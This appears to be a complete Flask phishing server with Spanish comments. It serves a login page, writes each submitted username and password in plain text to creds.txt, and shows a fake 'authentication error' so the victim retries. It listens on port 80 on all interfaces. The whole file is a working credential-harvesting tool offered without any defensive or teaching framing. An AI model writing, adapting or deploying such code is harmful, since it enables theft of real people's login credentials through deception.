from flask import Flask, request, redirect

app = Flask(__name__)

@app.route("/")
def home():
    return open("index.html").read()

@app.route("/login", methods=["POST"])
def login():
    user = request.form.get("user")
    password = request.form.get("pass")

    # Guardar credenciales
    with open("creds.txt", "a") as f:
        f.write(f"Usuario: {user} | Password: {password}\n")

    # Opcional: redirigir a una página falsa de error
    return "<h3>Error de autenticación. Intente nuevamente.</h3>"

app.run(host="0.0.0.0", port=80)

